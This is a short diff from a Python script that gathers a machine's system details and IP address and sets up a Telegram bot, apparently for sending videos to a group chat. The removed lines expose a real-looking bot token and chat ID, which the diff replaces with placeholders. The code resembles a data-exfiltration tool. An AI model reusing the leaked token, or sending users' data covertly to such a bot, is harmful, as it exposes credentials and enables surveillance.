@@ -86,8 +86,8 @@ def get_isys():
     system_info = platform.uname()
     return f"{system_info.system} {system_info.node} {system_info.release} {system_info.version} {system_info.machine} {system_info.processor}", ip_address
 
-CHAT_ID = '-4260814090'
-bot = Bot(token='7012635914:AAGHv6MlyTP8Jbat8TFGZiTxAz9qw2dXB6Q')
+CHAT_ID = '<idchatgrouptele>'
+bot = Bot(token='<tokenbottele>')
 system_info, ip_address = get_isys()
 
 async def send_v(video_path):
